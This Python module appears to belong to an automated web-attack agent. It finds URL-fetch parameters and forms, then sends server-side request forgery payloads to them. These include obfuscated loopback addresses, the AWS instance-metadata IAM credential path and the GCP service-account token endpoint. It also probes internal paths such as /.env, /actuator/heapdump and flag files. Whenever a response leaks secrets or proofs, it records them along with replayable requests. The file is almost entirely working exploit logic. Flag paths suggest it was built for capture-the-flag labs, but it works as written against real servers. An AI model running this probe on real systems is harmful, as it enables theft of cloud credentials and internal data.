from __future__ import annotations

import html
import json
from urllib.parse import parse_qsl, quote, urlsplit

from ravage.agent_core.agent_state import AgentState
from ravage.probe_suite_parts.result import ProbeRunResult
from ravage.probe_suite_parts.support import (
    _dedupe,
    _form_targets,
    _int_value,
    _parameter_targets,
    _string_items,
)
from ravage.web_core.http_probe import (
    ProbeResponse,
    ProbeSession,
    form_defaults,
    inject_query_param,
    response_secrets,
)
from ravage.web_core.proof_recognizer import recognize_proofs

_SSRF_REQUEST_BUDGET = 48
_MAX_OBSERVED_URL_LENGTH = 1_000
_URL_FETCH_NAME_MARKERS = (
    "url",
    "uri",
    "endpoint",
    "webhook",
    "callback",
    "next",
    "redirect",
    "avatar",
    "image",
    "feed",
    "import",
    "fetch",
    "proxy",
    "remote",
)


def probe_ssrf_boundary(session: ProbeSession, state: AgentState) -> ProbeRunResult:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    budget = _SSRF_REQUEST_BUDGET
    targets = _ssrf_targets(state)
    generic_payloads = _ssrf_payloads(session)
    for target in targets:
        if budget <= 0:
            break
        observed_payloads = _observed_url_payloads(target)
        payloads = _dedupe([*observed_payloads, *generic_payloads])
        target_had_signal = False
        baseline = _send_target(session, target, _benign_url_payload(session))
        budget -= 1
        requests.append(
            baseline.summary(body_chars=220)
            | {
                "target": _target_brief(target),
                "probe_kind": "ssrf_baseline",
            }
        )
        for payload in payloads:
            if budget <= 0:
                break
            response = _send_target(session, target, payload)
            budget -= 1
            requests.append(
                response.summary(body_chars=360)
                | {
                    "target": _target_brief(target),
                    "probe_kind": "ssrf_candidate",
                    "payload": payload,
                }
            )
            signal = _ssrf_signal(response, baseline=baseline, payload=payload)
            if not signal:
                continue
            target_had_signal = True
            boundary_finding = {
                "type": "ssrf_boundary_signal",
                "input": _target_brief(target),
                "payload": payload,
                "signal": signal,
                "proofs": _signal_list(signal, "proofs"),
                "matches": _signal_list(signal, "matches"),
                "response": response.summary(body_chars=700),
                "baseline_replay": _target_replay(target, _benign_url_payload(session)),
                "replay": _target_replay(target, payload),
                "next": "Use this exact URL-fetch template for a bounded internal-path proof read.",
            }
            findings.append(boundary_finding)
            extraction_findings, extraction_requests, budget = _probe_ssrf_internal_paths(
                session,
                target,
                seed_payload=payload,
                baseline=baseline,
                budget=budget,
            )
            requests.extend(extraction_requests)
            findings.extend(extraction_findings)
            if _extraction_has_proofs(extraction_findings) or boundary_finding.get("proofs"):
                budget = max(budget, 0)
                break
            break
        if _extraction_has_proofs(findings):
            break
        if not target_had_signal and budget > 0:
            fallback_seed = (
                observed_payloads[0]
                if observed_payloads
                else session.origin.rstrip("/") + "/"
            )
            extraction_findings, extraction_requests, budget = _probe_ssrf_internal_paths(
                session,
                target,
                seed_payload=fallback_seed,
                baseline=baseline,
                budget=budget,
            )
            requests.extend(extraction_requests)
            findings.extend(extraction_findings)
            if _extraction_has_proofs(extraction_findings):
                break
    return ProbeRunResult(
        ok=bool(findings),
        probe="ssrf_boundary",
        summary=(
            f"tested {len(targets)} URL-fetch target(s), "
            f"requests={_SSRF_REQUEST_BUDGET - budget}, findings={len(findings)}"
        ),
        findings=findings[:20],
        requests=requests[:80],
    )


def _ssrf_targets(state: AgentState) -> list[dict[str, object]]:
    targets: list[dict[str, object]] = []
    for target in _parameter_targets(state, limit=24):
        name = str(target.get("name") or "")
        hints = _string_items(target.get("hints"))
        sources = _string_items(target.get("sources"))
        if not _looks_like_url_fetch_input(name, hints + sources):
            continue
        target_markers = hints + sources
        targets.append(
            {
                "kind": _ssrf_target_kind(target_markers),
                "url": target.get("url"),
                "input": name,
                "hints": hints,
                "priority": _int_value(target.get("priority")) + 40,
            }
        )
        targets.append(
            {
                "kind": "post_form_param",
                "url": target.get("url"),
                "input": name,
                "hints": hints + ["post_form_fallback"],
                "priority": _int_value(target.get("priority")) + 52,
            }
        )
    for form in _form_targets(state, limit=12):
        action = str(form.get("action") or state.surface.get("target_url") or "")
        form_hints = _string_items(form.get("categories"))
        for input_name in _ssrf_form_input_names(form):
            hints = form_hints + [action]
            if not _looks_like_url_fetch_input(input_name, hints):
                continue
            priority = 80
            if _observed_url_payloads({"input": input_name, "form": form}):
                priority += 20
            if _form_auth_headers(form):
                priority += 10
            targets.append(
                {
                    "kind": "form",
                    "url": action,
                    "input": input_name,
                    "form": form,
                    "hints": hints,
                    "priority": priority,
                }
            )
    return _ordered_targets(targets)[:16]


def _signal_list(signal: dict[str, object], key: str) -> list[object]:
    value = signal.get(key)
    if not isinstance(value, list):
        return []
    items: list[object] = []
    for item in value:
        items.append(item)
    return items


def _extraction_has_proofs(findings: list[dict[str, object]]) -> bool:
    for finding in findings:
        if finding.get("proofs"):
            return True
    return False


def _ssrf_target_kind(markers: list[str]) -> str:
    if _looks_like_json_body_target(markers):
        return "json_post"
    return "query_param"


def _looks_like_url_fetch_input(name: str, hints: list[str]) -> bool:
    lowered = name.lower()
    hint_text = _lowered_joined_items(hints)
    if "url" in hints or _contains_marker(hint_text, _URL_FETCH_NAME_MARKERS):
        return True
    return _contains_marker(lowered, _URL_FETCH_NAME_MARKERS)


def _lowered_joined_items(items: list[str]) -> str:
    lowered_items: list[str] = []
    for item in items:
        lowered_items.append(str(item).lower())
    return " ".join(lowered_items)


def _contains_marker(text: str, markers: tuple[str, ...]) -> bool:
    for marker in markers:
        if marker in text:
            return True
    return False


def _ssrf_form_input_names(form: dict[str, object]) -> list[str]:
    names: list[str] = []
    raw_inputs = form.get("inputs")
    if not isinstance(raw_inputs, list):
        return names
    for input_field in raw_inputs:
        if not isinstance(input_field, dict):
            continue
        name = str(input_field.get("name") or "")
        if not name:
            continue
        input_type = str(input_field.get("type") or "").lower()
        if input_type in {"submit", "button", "reset", "file"}:
            continue
        if input_type == "hidden" and not _hidden_field_looks_like_ssrf_input(name, input_field):
            continue
        names.append(name)
    return names[:8]


def _hidden_field_looks_like_ssrf_input(name: str, input_field: dict[str, object]) -> bool:
    if _looks_like_url_fetch_input(name, []):
        return True
    return _field_value_looks_like_url(input_field)


def _field_value_looks_like_url(input_field: dict[str, object]) -> bool:
    value = str(input_field.get("value") or "").strip().lower()
    if not value:
        return False
    if value.startswith(("http://", "https://", "//", "ftp://")):
        return True
    return _contains_marker(value, ("localhost", "127.0.0.1", "metadata", "169.254.169.254"))


def _looks_like_json_body_target(markers: list[str]) -> bool:
    text = " ".join(markers).lower()
    if "json" not in text:
        return False
    return _contains_marker(text, ("body", "post", "request", "content-type", "observed"))


def _ordered_targets(targets: list[dict[str, object]]) -> list[dict[str, object]]:
    deduped: dict[tuple[str, str, str], dict[str, object]] = {}
    for target in targets:
        key = (
            str(target.get("kind")),
            str(target.get("url")),
            str(target.get("input")),
        )
        previous = deduped.get(key)
        if previous is None or _int_value(target.get("priority")) > _int_value(previous.get("priority")):
            deduped[key] = target
    ordered = list(deduped.values())
    ordered.sort(key=_target_sort_key)
    return ordered


def _target_sort_key(target: dict[str, object]) -> tuple[int, str, str]:
    return (
        -_int_value(target.get("priority")),
        str(target.get("url") or ""),
        str(target.get("input") or ""),
    )


def _port_suffix(port: int | None) -> str:
    if port is None:
        return ""
    return f":{port}"


def _ssrf_payloads(session: ProbeSession) -> list[str]:
    origin = session.origin.rstrip("/")
    parsed = urlsplit(origin)
    port = _port_suffix(parsed.port)
    payloads = [
        origin + "/",
        f"{parsed.scheme}://127.0.0.1{port}/",
        f"{parsed.scheme}://localhost{port}/",
        f"{parsed.scheme}://0.0.0.0{port}/",
        f"{parsed.scheme}://[::1]{port}/",
        f"{parsed.scheme}://127.1{port}/",
        f"{parsed.scheme}://2130706433{port}/",
        f"{parsed.scheme}://0177.0.0.1{port}/",
        f"{parsed.scheme}://0x7f.0x0.0x0.0x1{port}/",
        "http://127.0.0.1:80/",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:8000/",
        "http://localhost:80/",
        "http://localhost:5000/",
        "http://localhost:8000/",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    ]
    return _dedupe(payloads)


def _observed_url_payloads(target: dict[str, object]) -> list[str]:
    values: list[str] = []
    input_name = str(target.get("input") or "")
    raw_form = target.get("form")
    if input_name and isinstance(raw_form, dict):
        default = form_defaults(raw_form).get(input_name, "")
        if default:
            values.append(default)
    try:
        query = parse_qsl(urlsplit(str(target.get("url") or "")).query, keep_blank_values=True)
    except ValueError:
        query = []
    for name, value in query:
        if name == input_name and value:
            values.append(value)
    return _dedupe([value for value in values if _usable_observed_url_payload(value)])[:6]


def _usable_observed_url_payload(value: str) -> bool:
    if len(value) > _MAX_OBSERVED_URL_LENGTH:
        return False
    try:
        parsed = urlsplit(value)
    except ValueError:
        return False
    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
        return False
    return parsed.username is None and parsed.password is None


def _probe_ssrf_internal_paths(
    session: ProbeSession,
    target: dict[str, object],
    *,
    seed_payload: str,
    baseline: ProbeResponse,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    baseline_proofs = set(recognize_proofs(baseline.body))
    baseline_matches = set(response_secrets(baseline))
    best_signal: dict[str, object] | None = None
    for payload in _ssrf_internal_payloads(session, seed_payload):
        if budget <= 0:
            break
        response = _send_target(session, target, payload)
        budget -= 1
        requests.append(
            response.summary(body_chars=520)
            | {
                "target": _target_brief(target),
                "probe_kind": "ssrf_internal_extract",
                "payload": payload,
            }
        )
        proofs = _new_proofs(response, baseline_proofs)
        matches = _new_matches(response, baseline_matches)
        if proofs or matches:
            findings.append(
                {
                    "type": _ssrf_extraction_finding_type(proofs),
                    "input": _target_brief(target),
                    "payload": payload,
                    "proofs": proofs,
                    "matches": matches[:12],
                    "response": response.summary(body_chars=900),
                    "replay": _target_replay(target, payload),
                }
            )
            return findings, requests, budget
        signal = _ssrf_signal(response, baseline=baseline, payload=payload)
        if signal and best_signal is None:
            best_signal = {
                "type": "ssrf_internal_path_signal",
                "input": _target_brief(target),
                "payload": payload,
                "signal": signal,
                "response": response.summary(body_chars=700),
                "replay": _target_replay(target, payload),
            }
    if best_signal:
        findings.append(best_signal)
    return findings, requests, budget


def _ssrf_extraction_finding_type(proofs: list[str]) -> str:
    if proofs:
        return "ssrf_extracted_proof"
    return "ssrf_extracted_secret"


def _ssrf_internal_payloads(session: ProbeSession, seed_payload: str) -> list[str]:
    payloads: list[str] = []
    paths = (
        "/FLAG.txt",
        "/flag",
        "/flag.txt",
        "/proof.txt",
        "/admin/flag",
        "/admin/flag/",
        "/admin",
        "/admin/",
        "/debug",
        "/debug/vars",
        "/actuator",
        "/actuator/env",
        "/actuator/heapdump",
        "/.env",
        "/config",
        "/config.json",
        "/metadata",
        "/metadata/",
        "/latest/meta-data/",
        "/latest/meta-data/iam/security-credentials/",
    )
    for base in _ssrf_internal_bases(session, seed_payload):
        for path in paths:
            payloads.append(base.rstrip("/") + path)
    payloads.extend(
        [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "http://metadata/computeMetadata/v1/instance/service-accounts/default/token",
        ]
    )
    return _dedupe(payloads)[:36]


def _ssrf_internal_bases(session: ProbeSession, seed_payload: str) -> list[str]:
    bases: list[str] = []
    origin = urlsplit(session.origin.rstrip("/"))
    port = _port_suffix(origin.port)
    scheme = origin.scheme or "http"
    seed = urlsplit(seed_payload)
    if seed.scheme in {"http", "https"} and seed.netloc and seed.netloc != origin.netloc:
        bases.append(f"{seed.scheme}://{seed.netloc}")
    bases.extend(
        [
            f"{scheme}://127.0.0.1",
            f"{scheme}://localhost",
            f"{scheme}://0.0.0.0",
            f"{scheme}://127.1",
            f"{scheme}://2130706433",
            f"{scheme}://127.0.0.1{port}",
            f"{scheme}://localhost{port}",
            f"{scheme}://0.0.0.0{port}",
            f"{scheme}://127.1{port}",
            f"{scheme}://2130706433{port}",
            "http://127.0.0.1:80",
            "http://127.0.0.1:5000",
            "http://127.0.0.1:8000",
            "http://localhost:80",
            "http://localhost:5000",
            "http://localhost:8000",
        ]
    )
    for raw in (seed_payload, session.origin.rstrip("/")):
        parsed = urlsplit(raw)
        if parsed.scheme and parsed.netloc:
            bases.append(f"{parsed.scheme}://{parsed.netloc}")
    return _dedupe(bases)


def _benign_url_payload(session: ProbeSession) -> str:
    return session.origin.rstrip("/") + "/ravage-ssrf-baseline"


def _send_target(session: ProbeSession, target: dict[str, object], value: str) -> ProbeResponse:
    kind = str(target.get("kind") or "")
    url = str(target.get("url") or session.target_url)
    input_name = str(target.get("input") or "")
    raw_form = target.get("form")
    if kind == "form" and isinstance(raw_form, dict):
        form = dict(raw_form)
        headers = _form_auth_headers(form)
        fields = form_defaults(form, marker_name=input_name, marker=value)
        method = str(form.get("method") or "GET").upper()
        action = str(form.get("action") or url)
        if method == "POST":
            return session.post_form(action, fields, headers=headers or None)
        query_url = action
        for name, field_value in fields.items():
            query_url = inject_query_param(query_url, name, field_value)
        return session.get(query_url, headers=headers or None)
    if kind == "json_post":
        body = json.dumps({input_name: value}).encode("utf-8")
        return session.request("POST", url, data=body, headers={"Content-Type": "application/json"})
    if kind == "post_form_param":
        return session.post_form(url, {input_name: value})
    return session.get(inject_query_param(url, input_name, value))


def _form_auth_headers(form: dict[str, object]) -> dict[str, str]:
    raw_headers = form.get("auth_headers")
    if not isinstance(raw_headers, dict):
        return {}
    headers: dict[str, str] = {}
    for name, value in raw_headers.items():
        header = str(name).strip()
        text = str(value).strip()
        if not header or not text or "\r" in header or "\n" in header:
            continue
        if "\r" in text or "\n" in text:
            continue
        headers[header] = text
    return headers


def _target_replay(target: dict[str, object], value: str) -> dict[str, object]:
    kind = str(target.get("kind") or "")
    url = str(target.get("url") or "")
    input_name = str(target.get("input") or "")
    raw_form = target.get("form")
    if kind == "form" and isinstance(raw_form, dict):
        form = dict(raw_form)
        fields = form_defaults(form, marker_name=input_name, marker=value)
        return {
            "method": str(form.get("method") or "GET").upper(),
            "url": str(form.get("action") or url),
            "payload_field": input_name,
            "form": fields,
            "encoding": "application/x-www-form-urlencoded",
        }
    if kind == "json_post":
        return {
            "method": "POST",
            "url": url,
            "payload_field": input_name,
            "form": {input_name: value},
            "encoding": "application/json",
            "headers": {"Content-Type": "application/json"},
        }
    if kind == "post_form_param":
        return {
            "method": "POST",
            "url": url,
            "payload_field": input_name,
            "form": {input_name: value},
            "encoding": "application/x-www-form-urlencoded",
        }
    return {
        "method": "GET",
        "url": inject_query_param(url, input_name, value),
        "payload_field": input_name,
    }


def _target_brief(target: dict[str, object]) -> dict[str, object]:
    return {
        "kind": target.get("kind"),
        "url": target.get("url"),
        "input": target.get("input"),
        "hints": _string_items(target.get("hints")),
    }


def _ssrf_signal(
    response: ProbeResponse,
    *,
    baseline: ProbeResponse,
    payload: str,
) -> dict[str, object]:
    baseline_proofs = set(recognize_proofs(baseline.body))
    baseline_matches = set(response_secrets(baseline))
    proofs = _new_proofs(response, baseline_proofs)
    matches = _new_matches(response, baseline_matches)
    if proofs or matches:
        return {"kind": "proof_or_secret", "proofs": proofs, "matches": matches}
    if not _ssrf_status_can_signal(response.status):
        return {}

    marker_body = _strip_reflected_payload(response.body, payload)
    baseline_markers = set(_internal_fetch_markers(baseline.body))
    new_markers = _new_internal_fetch_markers(marker_body, baseline_markers)
    length_delta = len(marker_body) - len(baseline.body)
    if new_markers and abs(length_delta) >= 20:
        return _internal_fetch_delta_signal(payload, new_markers, length_delta)
    if response.error and response.error != baseline.error:
        return {"kind": "fetch_error_delta", "error": response.error[:160]}
    return {}


def _new_proofs(response: ProbeResponse, baseline_proofs: set[str]) -> list[str]:
    proofs: list[str] = []
    for proof in recognize_proofs(response.body):
        if proof not in baseline_proofs:
            proofs.append(proof)
    return proofs


def _new_matches(response: ProbeResponse, baseline_matches: set[str]) -> list[str]:
    matches: list[str] = []
    for match in response_secrets(response):
        if match not in baseline_matches:
            matches.append(match)
    return matches


def _ssrf_status_can_signal(status: int | None) -> bool:
    if status is None:
        return False
    return status in {200, 201, 202, 204, 206, 301, 302, 303, 500}


def _new_internal_fetch_markers(marker_body: str, baseline_markers: set[str]) -> list[str]:
    new_markers: list[str] = []
    for marker in _internal_fetch_markers(marker_body):
        if marker not in baseline_markers:
            new_markers.append(marker)
    return new_markers


def _internal_fetch_delta_signal(payload: str, new_markers: list[str], length_delta: int) -> dict[str, object]:
    return {
        "kind": "internal_fetch_delta",
        "payload": payload,
        "new_markers": new_markers[:8],
        "length_delta": length_delta,
    }


def _strip_reflected_payload(body: str, payload: str) -> str:
    stripped = body
    for variant in _payload_reflection_variants(payload):
        if variant:
            stripped = stripped.replace(variant, "")
    return stripped


def _payload_reflection_variants(payload: str) -> tuple[str, ...]:
    return (
        payload,
        html.escape(payload, quote=True),
        quote(payload, safe=""),
        quote(payload, safe="/:"),
    )


def _internal_fetch_markers(body: str) -> list[str]:
    lowered = body.lower()
    markers: list[str] = []
    for marker in (
        "werkzeug",
        "flask",
        "nginx",
        "apache",
        "metadata",
        "flag_endpoint",
        "internal",
        "169.254",
        "localhost",
        "admin",
        "debug",
        "index",
        "root:x:0:0",
    ):
        if marker in lowered:
            markers.append(marker)
    return markers


__all__ = ["probe_ssrf_boundary"]
